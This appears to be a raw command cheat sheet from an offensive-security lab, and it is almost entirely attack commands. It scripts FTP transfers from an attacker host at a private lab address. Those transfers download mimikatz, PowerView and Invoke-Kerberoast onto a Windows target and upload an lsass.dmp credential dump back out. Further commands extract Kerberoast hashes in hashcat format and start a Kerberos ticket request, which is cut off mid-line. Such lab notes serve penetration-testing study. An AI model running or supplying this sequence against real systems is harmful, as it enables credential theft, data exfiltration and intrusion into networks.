echo open 192.168.119.175 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo GET mimilib.dll >> ftp.txt
echo GET mimidrv.sys >> ftp.txt
echo bye >> ftp.txt

open 192.168.119.175 21
USER offsec
lab
bin 
GET mimikatz.exe 
GET mimilib.dll 
GET mimidrv.sys 
bye 


echo open 192.168.119.175 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo put lsass.dmp >> ftp.txt
echo bye >> ftp.txt


echo open 192.168.119.175 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET Invoke-Kerberoast.ps1 >> ftp.txt
echo bye >> ftp.txt


echo open 192.168.119.175 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET PowerView.ps1 >> ftp.txt
echo bye >> ftp.txt

.\Invoke-Kerberoast.ps1 -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-hash0.txt


Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 